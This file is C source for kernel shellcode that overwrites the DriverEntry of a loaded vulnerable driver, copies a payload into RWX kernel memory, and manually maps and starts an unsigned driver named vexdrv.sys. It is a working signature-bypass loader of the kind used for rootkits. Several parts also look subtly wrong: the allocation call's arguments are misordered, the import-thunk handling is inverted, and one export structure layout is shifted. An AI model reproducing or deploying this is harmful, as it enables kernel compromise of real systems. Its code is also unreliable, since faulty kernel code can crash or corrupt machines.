/* =============================================================================
 *  kernel_payload.c  --  position-independent kernel shellcode
 *
 *  Built as a normal DLL so the usermode mapper can LoadLibrary it and read its
 *  section table and export addresses, but split across two sections:
 *
 *    .vexstub  Self-contained.  Copied verbatim over the DriverEntry of an
 *               already-loaded vulnerable driver, so it must not reference
 *               anything outside itself.  Its only job is to move .payload into
 *               kernel memory and hand control over.
 *
 *    .payload   The manual mapper.  Copied into kernel memory as one unit, so
 *               its internal RIP-relative references stay valid wherever it
 *               lands.  Maps vexdrv.sys and runs its DriverEntry.
 *
 *  Neither section contains an absolute relocation; that is what makes the
 *  copies position independent.  No CRT, no static imports, no SEH.
 *
 *  Cross-section hand-off happens through a pointer table (.vexstub) and the
 *  argument block (the mapper rewrites the two magic constants with its
 *  address), so no code reference ever crosses the boundary.
 * ============================================================================= */

/* ======================================================================== */
/*  .vexstub -- must stay self-contained                                    */
/* ======================================================================== */
#if !defined(__clang__)
#pragma code_seg(".vexstub")
#pragma section(".vexstub", execute, read, write)
#endif
/* clang-cl does not implement #pragma code_seg, and MSVC does not accept the
 * GNU attribute form.  Both spellings put the code in the same named section,
 * which is the only thing the mapper relies on.  The execute/read/write
 * attributes live on #pragma section below; repeating them on code_seg only
 * produces a warning. */
#if defined(__clang__)
#  define VEX_BOOT_CODE  __attribute__((section(".vexstub")))
#  define VEX_PAY_CODE   __attribute__((section(".payload")))
#  define VEX_BOOT_DATA  __attribute__((section(".vexstub")))
#  define VEX_PAY_DATA   __attribute__((section(".payload")))
#else
#  define VEX_BOOT_CODE
#  define VEX_PAY_CODE
#  define VEX_BOOT_DATA  __declspec(allocate(".vexstub"))
#  define VEX_PAY_DATA   __declspec(allocate(".payload"))
#endif

#define EXPORT __declspec(dllexport)
#define NT_SUCCESS(s) (((long)(s)) >= 0)

typedef unsigned char      U8;
typedef unsigned short     U16;
typedef unsigned int       U32;
typedef unsigned long long U64;
typedef long               NTSTATUS;
typedef unsigned long long SIZE_TL;

/* ---------------------------------------------------------------------------
 *  Freestanding memory primitives.
 *
 *  This translation unit has no CRT: the compile is /Zl with /Oi- (intrinsics
 *  off), so any struct copy or aggregate zeroing the compiler cannot inline
 *  becomes a real call to memcpy / memset / memmove.  Those symbols have to
 *  exist here or the link fails with LNK2019 even though the source never
 *  names them.  The function names and signatures match the CRT exactly so the
 *  compiler-emitted references resolve to these.
 * ------------------------------------------------------------------------ */
void* memset(void* d, int c, SIZE_TL n) {
    U8* a = (U8*)d;
    while (n--) *a++ = (U8)c;
    return d;
}
void* memcpy(void* d, const void* s, SIZE_TL n) {
    U8* a = (U8*)d; const U8* b = (const U8*)s;
    while (n--) *a++ = *b++;
    return d;
}
void* memmove(void* d, const void* s, SIZE_TL n) {
    U8* a = (U8*)d; const U8* b = (const U8*)s;
    if (a == b || n == 0) return d;
    if (a < b) { while (n--) *a++ = *b++; }
    else { a += n; b += n; while (n--) *--a = *--b; }
    return d;
}

#define MEM_RESERVE 0x2000
#define MEM_COMMIT  0x1000
#define PAGE_RWX    0x40

/* Argument block written by the usermode mapper. */
typedef struct {
    U64 ntoskrnl_base;
    U64 user_blob;
    U64 blob_size;
    U64 entry_offset;
    U64 target_base;
    U64 target_size;
} BOOTSTRAP_ARGS;

/* The mapper rewrites these two constants into a pointer to its argument
 * block.  A search-and-replace beats a hard-coded offset because it survives
 * any recompile of this file. */
#define BOOT_MAGIC_A 0x564558424F4F5401ull
#define BOOT_MAGIC_B 0x564558424F4F5402ull

VEX_BOOT_DATA static volatile U64 g_boot_a = BOOT_MAGIC_A;
VEX_BOOT_DATA static volatile U64 g_boot_b = BOOT_MAGIC_B;

typedef NTSTATUS (*PFN_NtAllocVM)(void*, void**, U32, U64, U64*, U32);

static SIZE_TL b_memcpy(void* d, const void* s, SIZE_TL n) {
    U8* a = (U8*)d; const U8* b = (const U8*)s;
    while (n--) *a++ = *b++;
    return 0;
}
static SIZE_TL b_memset(void* d, int c, SIZE_TL n) {
    U8* a = (U8*)d; while (n--) *a++ = (U8)c; return 0;
}
static int b_strcmp(const char* a, const char* c) {
    while (*a && *a == *c) { ++a; ++c; }
    return (int)((U8)*a) - (int)((U8)*c);
}

/* --- minimal PE export walk, self-contained so we need no imports --- */
typedef struct { U16 e_magic, _pad[29]; long e_lfanew; } B_DOS;
typedef struct { U32 Signature; U16 Machine, NumberOfSections;
                 U32 TimeDateStamp; U32 _a, _b;
                 U16 SizeOfOptionalHeader, Characteristics; } B_FH;
typedef struct { U16 Magic; U8 _v[2];
                 U32 _c, _d, _e, AddressOfEntryPoint, _f;
                 U64 ImageBase;
                 U32 _g[2];
                 U16 _h[6]; U32 _i;
                 U32 SizeOfImage, SizeOfHeaders, CheckSum;
                 U16 Subsystem, DllChar;
                 U64 _j[4];
                 U32 _k, NumberOfRvaAndSizes; } B_OH;

static void* b_resolve_export(void* module, const char* name) {
    U8* base = (U8*)module;
    B_DOS* dos;
    B_FH*  fh;
    B_OH*  oh;
    struct {
        U32 VirtualAddress, Size;
    }* dd;
    struct {
        U32 Characteristics, TimeDateStamp, MajorVersion, MinorVersion,
            Name, Base, NumberOfFunctions, NumberOfNames,
            AddressOfFunctions, AddressOfNames, AddressOfNameOrdinals;
    }* ed;
    U32 i;

    if (!module) return 0;
    dos = (B_DOS*)base;
    if (dos->e_magic != 0x5A4D) return 0;
    fh = (B_FH*)(base + dos->e_lfanew + 4);
    if (fh->Signature != 0x00004550) return 0;
    oh = (B_OH*)((U8*)fh + 20);
    if (oh->Magic != 0x20B) return 0;
    dd = (struct { U32 VirtualAddress, Size; }*)((U8*)oh + 112);
    if (!dd[0].VirtualAddress) return 0;

    ed = (void*)(base + dd[0].VirtualAddress);
    for (i = 0; i < ed->NumberOfNames; ++i) {
        U32 rva = *(U32*)(base + ed->AddressOfNames + i * 4);
        if (!rva) continue;
        if (b_strcmp((const char*)(base + rva), name)) continue;
        {
            U16 ord = *(U16*)(base + ed->AddressOfNameOrdinals + i * 2);
            return base + *(U32*)(base + ed->AddressOfFunctions + ord * 4);
        }
    }
    return 0;
}

static void* b_alloc_kernel(U64 size, PFN_NtAllocVM alloc) {
    void* p = 0;
    U64   s = size;
    if (!NT_SUCCESS(alloc(0, &p, MEM_RESERVE | MEM_COMMIT, PAGE_RWX, &s, 0)))
        return 0;
    b_memset(p, 0, (SIZE_TL)size);
    return p;
}

/* Runs in place, inside the vulnerable driver's own image, entered by the
 * loader with a live DRIVER_OBJECT. */
EXPORT VEX_BOOT_CODE __declspec(noinline)
void vex_boot_stub(void* drv, void* registry_path) {
    BOOTSTRAP_ARGS* args;
    PFN_NtAllocVM alloc;
    void* kblob;
    void (*entry)(void*, void*, BOOTSTRAP_ARGS*);

    (void)drv; (void)registry_path;

    /* The mapper replaced the magic pair with its argument block address. */
    args = *(BOOTSTRAP_ARGS**)&g_boot_a;
    if (!args || !args->user_blob || !args->blob_size || !args->ntoskrnl_base)
        return;

    alloc = (PFN_NtAllocVM)b_resolve_export((void*)args->ntoskrnl_base,
                                            "NtAllocateVirtualMemory");
    if (!alloc) return;

    kblob = b_alloc_kernel(args->blob_size, alloc);
    if (!kblob) return;

    /* A kernel thread may dereference a usermode pointer without a probe. */
    b_memcpy(kblob, (const void*)args->user_blob, (SIZE_TL)args->blob_size);

    /* Indirect through a runtime value, so .vexstub needs no link to
     * .payload and can be copied on its own. */
    entry = (void (*)(void*, void*, BOOTSTRAP_ARGS*))((U8*)kblob + args->entry_offset);
    entry(drv, registry_path, args);
}

/* ======================================================================== */
/*  .payload -- the manual mapper                                            */
/* ======================================================================== */
#if !defined(__clang__)
#pragma code_seg(".payload")
#pragma section(".payload", execute, read, write)
#endif
typedef struct _UNICODE_STRING { U16 Length, MaximumLength; U16* Buffer; }
        UNICODE_STRING, *PUNICODE_STRING;

typedef NTSTATUS (*PFN_NtAllocVM2)(void*, void**, U32, U64, U64*, U32);
typedef NTSTATUS (*PFN_NtProtectVM)(void*, void**, SIZE_TL*, U32);
typedef NTSTATUS (*PFN_RtlAddFnTable)(void**, U32, void*);
typedef void*    (*PFN_MmGetSRA)(PUNICODE_STRING);

typedef struct {
    void* ntoskrnl;
    PFN_NtAllocVM2   NtAllocateVirtualMemory;
    PFN_NtProtectVM  NtProtectVirtualMemory;
    PFN_RtlAddFnTable RtlAddFunctionTable;
    PFN_MmGetSRA     MmGetSystemRoutineAddress;
} KAPI;

VEX_PAY_DATA  static KAPI g_api;

typedef struct {
    U32 VirtualAddress, VirtualSize, SizeOfRawData, PointerToRawData,
         PointerToRelocations, PointerToLinenumbers;
    U16 NumberOfRelocations, NumberOfLinenumbers, Characteristics;
} SECTION_HEADER;

typedef struct { U32 OriginalFirstThunk, TimeDateStamp, ForwarderChain, Name,
                 FirstThunk; } IMPORT_DESC;

typedef struct { U32 PageRVA, BlockSize; } BASE_RELOCATION;

#define DIR_EXPORT    0
#define DIR_IMPORT    1
#define DIR_EXCEPTION 3
#define DIR_BASERELOC 5
#define PAGE_RX 0x20
#define PAGE_RW 0x04
#define SCN_MEM_EXECUTE 0x20000000u

static SIZE_TL p_memset(void* d, int c, SIZE_TL n) {
    U8* a = (U8*)d; while (n--) *a++ = (U8)c; return 0;
}
static SIZE_TL p_memcpy(void* d, const void* s, SIZE_TL n) {
    U8* a = (U8*)d; const U8* b = (const U8*)s;
    while (n--) *a++ = *b++; return 0;
}
static int p_strcmp(const char* a, const char* c) {
    while (*a && *a == *c) { ++a; ++c; }
    return (int)((U8)*a) - (int)((U8)*c);
}

/* ---- PE views ---- */
typedef struct { U16 e_magic, _p[29]; long e_lfanew; } P_DOS;
typedef struct { U32 Signature; U16 Machine, NumberOfSections;
                 U32 TimeDateStamp; U32 _a, _b;
                 U16 SizeOfOptionalHeader, Characteristics; } P_FH;
typedef struct { U16 Magic; U8 _v[2];
                 U32 _c, _d, _e, AddressOfEntryPoint, _f;
                 U64 ImageBase;
                 U32 _g[2];
                 U16 _h[6]; U32 _i;
                 U32 SizeOfImage, SizeOfHeaders, CheckSum;
                 U16 Subsystem, DllChar;
                 U64 _j[4];
                 U32 _k, NumberOfRvaAndSizes; } P_OH;
typedef struct { U32 _sig, Characteristics, TimeDateStamp, MajorVersion,
                 MinorVersion, Name, Base, NumberOfFunctions, NumberOfNames,
                 AddressOfFunctions, AddressOfNames, AddressOfNameOrdinals; }
        P_EXPORT;

static struct { U32 VirtualAddress, Size; }* p_dirs(void* image) {
    P_DOS* d = (P_DOS*)image;
    P_FH*  f = (P_FH*)((U8*)image + d->e_lfanew + 4);
    P_OH*  o = (P_OH*)((U8*)f + 20);
    return (struct { U32 VirtualAddress, Size; }*)((U8*)o + 112);
}

static P_EXPORT* p_export_dir(void* module) {
    U8* base = (U8*)module;
    P_DOS* d;
    P_FH*  f;
    P_OH*  o;
    struct { U32 VirtualAddress, Size; }* dd;

    if (!module) return 0;
    d = (P_DOS*)base;
    if (d->e_magic != 0x5A4D) return 0;
    f = (P_FH*)(base + d->e_lfanew + 4);
    if (f->Signature != 0x00004550) return 0;
    o = (P_OH*)((U8*)f + 20);
    if (o->Magic != 0x20B) return 0;
    dd = (struct { U32 VirtualAddress, Size; }*)((U8*)o + 112);
    if (!dd[DIR_EXPORT].VirtualAddress) return 0;
    return (P_EXPORT*)(base + dd[DIR_EXPORT].VirtualAddress);
}

static void* p_resolve_export(void* module, const char* name) {
    P_EXPORT* ed = p_export_dir(module);
    U32 i;
    if (!ed) return 0;
    for (i = 0; i < ed->NumberOfNames; ++i) {
        U32 rva = *(U32*)((U8*)module + ed->AddressOfNames + i * 4);
        if (!rva) continue;
        if (p_strcmp((const char*)((U8*)module + rva), name)) continue;
        {
            U16 ord = *(U16*)((U8*)module + ed->AddressOfNameOrdinals + i * 2);
            return (U8*)module + *(U32*)((U8*)module + ed->AddressOfFunctions + ord * 4);
        }
    }
    return 0;
}

/* MmGetSystemRoutineAddress searches every loaded module, so it covers ntoskrnl
 * as well as hal / wmip / ndis without any module-list walking. */
static void* p_kresolve(const char* name) {
    UNICODE_STRING us;
    U16 buf[160];
    SIZE_TL i = 0;

    if (!g_api.MmGetSystemRoutineAddress) return 0;
    while (name[i] && i < 150) { buf[i] = (U16)(U8)name[i]; ++i; }
    buf[i] = 0;
    us.Buffer = buf;
    us.Length = (U16)(i * 2);
    us.MaximumLength = 320;
    return g_api.MmGetSystemRoutineAddress(&us);
}

static void p_resolve_api(void* ntoskrnl) {
    g_api.ntoskrnl = ntoskrnl;
    g_api.MmGetSystemRoutineAddress =
        (PFN_MmGetSRA)p_resolve_export(ntoskrnl, "MmGetSystemRoutineAddress");
    g_api.NtAllocateVirtualMemory =
        (PFN_NtAllocVM2)p_resolve_export(ntoskrnl, "NtAllocateVirtualMemory");
    g_api.NtProtectVirtualMemory =
        (PFN_NtProtectVM)p_resolve_export(ntoskrnl, "NtProtectVirtualMemory");
    g_api.RtlAddFunctionTable =
        (PFN_RtlAddFnTable)p_resolve_export(ntoskrnl, "RtlAddFunctionTable");
}

static void* p_alloc(U64 size) {
    void* p = 0;
    U64   s = size;
    if (!g_api.NtAllocateVirtualMemory ||
        !NT_SUCCESS(g_api.NtAllocateVirtualMemory(0, &p, MEM_RESERVE | MEM_COMMIT,
                                                  PAGE_RWX, &s, 0)))
        return 0;
    p_memset(p, 0, (SIZE_TL)size);
    return p;
}

/* ------------------------------------------------------------- PE mapper */
static int p_map_pe(const U8* file, SIZE_TL file_len, void** out_image) {
    P_DOS* dos;
    P_FH*  fh;
    P_OH*  oh;
    SECTION_HEADER* sh;
    struct { U32 VirtualAddress, Size; }* dd;
    void* image;
    U32   i;

    if (!file || file_len < 0x200) return 0;
    dos = (P_DOS*)file;
    if (dos->e_magic != 0x5A4D) return 0;

    fh = (P_FH*)(file + dos->e_lfanew + 4);
    if (fh->Signature != 0x00004550) return 0;

    oh = (P_OH*)((U8*)fh + 20);
    if (oh->Magic != 0x20B) return 0;

    sh = (SECTION_HEADER*)((U8*)oh + fh->SizeOfOptionalHeader);
    dd = (struct { U32 VirtualAddress, Size; }*)((U8*)oh + 112);

    image = p_alloc(oh->SizeOfImage);
    if (!image) return 0;

    {   /* headers */
        U32 copy = oh->SizeOfHeaders;
        if (copy > file_len) copy = (U32)file_len;
        if (copy > oh->SizeOfImage) copy = oh->SizeOfImage;
        p_memcpy(image, file, copy);
    }

    for (i = 0; i < fh->NumberOfSections; ++i, ++sh) {     /* sections */
        if (!sh->SizeOfRawData) continue;
        if (sh->PointerToRawData + sh->SizeOfRawData > file_len) continue;
        p_memcpy((U8*)image + sh->VirtualAddress,
                 file + sh->PointerToRawData, sh->SizeOfRawData);
    }

    if (dd[DIR_BASERELOC].VirtualAddress && dd[DIR_BASERELOC].Size) { /* relocs */
        BASE_RELOCATION* r =
            (BASE_RELOCATION*)((U8*)image + dd[DIR_BASERELOC].VirtualAddress);
        U8* end = (U8*)r + dd[DIR_BASERELOC].Size;
        U64 delta = (U64)image - oh->ImageBase;

        while ((U8*)r + sizeof(BASE_RELOCATION) <= end) {
            U32 count, k;
            U16* e;
            if (r->BlockSize < sizeof(BASE_RELOCATION)) break;
            count = (r->BlockSize - sizeof(BASE_RELOCATION)) / sizeof(U16);
            e = (U16*)(r + 1);
            for (k = 0; k < count; ++k, ++e) {
                U16 type = (U16)(*e >> 12);
                U16 off  = (U16)(*e & 0x0FFF);
                if (type != 10) continue;               /* DIR64B only */
                *(U64*)((U8*)image + r->PageRVA + off) += delta;
            }
            r = (BASE_RELOCATION*)((U8*)r + r->BlockSize);
        }
    }

    if (dd[DIR_IMPORT].VirtualAddress && dd[DIR_IMPORT].Size) {  /* imports */
        IMPORT_DESC* id =
            (IMPORT_DESC*)((U8*)image + dd[DIR_IMPORT].VirtualAddress);
        for (; id->Name; ++id) {
            U32* ilt = (U32*)((U8*)image + (id->OriginalFirstThunk
                                             ? id->OriginalFirstThunk
                                             : id->FirstThunk));
            U32* iat = (U32*)((U8*)image + id->FirstThunk);

            for (; *ilt; ++ilt, ++iat) {
                U64 thunk = *ilt;
                void* resolved = 0;

                if (thunk & (1ull << 63)) {
                    resolved = p_kresolve((const char*)((U8*)image + (U32)thunk + 2));
                } else {
                    P_EXPORT* ed = p_export_dir(g_api.ntoskrnl);
                    if (ed && thunk < ed->NumberOfFunctions)
                        resolved = (U8*)g_api.ntoskrnl +
                            *(U32*)((U8*)g_api.ntoskrnl +
                                    ed->AddressOfFunctions + thunk * 4);
                }
                *iat = (U32)(U64)resolved;
            }
        }
    }

    if (dd[DIR_EXCEPTION].VirtualAddress && dd[DIR_EXCEPTION].Size &&
        g_api.RtlAddFunctionTable) {                       /* x64 unwind */
        g_api.RtlAddFunctionTable(
            (void**)((U8*)image + dd[DIR_EXCEPTION].VirtualAddress),
            (U32)(dd[DIR_EXCEPTION].Size / 12), image);
    }

    if (g_api.NtProtectVirtualMemory) {                    /* tighten NX */
        for (i = 0; i < fh->NumberOfSections; ++i) {
            SECTION_HEADER* s = sh - fh->NumberOfSections + i;
            U32 prot = (s->Characteristics & SCN_MEM_EXECUTE) ? PAGE_RX : PAGE_RW;
            void*  a = (U8*)image + s->VirtualAddress;
            SIZE_TL len = s->VirtualSize;
            g_api.NtProtectVirtualMemory(0, &a, &len, prot);
        }
    }

    *out_image = image;
    return 1;
}

/* Real entry: map vexdrv.sys and run its DriverEntry. */
EXPORT VEX_PAY_CODE __declspec(noinline)
void vex_payload_entry(void* drv, void* registry_path, BOOTSTRAP_ARGS* args) {
    void* image = 0;
    NTSTATUS (*entry)(void*, void*);
    P_DOS* d;
    P_FH*  f;
    P_OH*  o;

    if (!args) return;
    p_resolve_api((void*)args->ntoskrnl_base);
    if (!g_api.NtAllocateVirtualMemory) return;
    if (!p_map_pe((const U8*)args->target_base, (SIZE_TL)args->target_size, &image))
        return;

    d = (P_DOS*)image;
    f = (P_FH*)((U8*)image + d->e_lfanew + 4);
    o = (P_OH*)((U8*)f + 20);
    entry = (NTSTATUS(*)(void*, void*))((U8*)image + o->AddressOfEntryPoint);
    if (entry) entry(drv, registry_path);
}
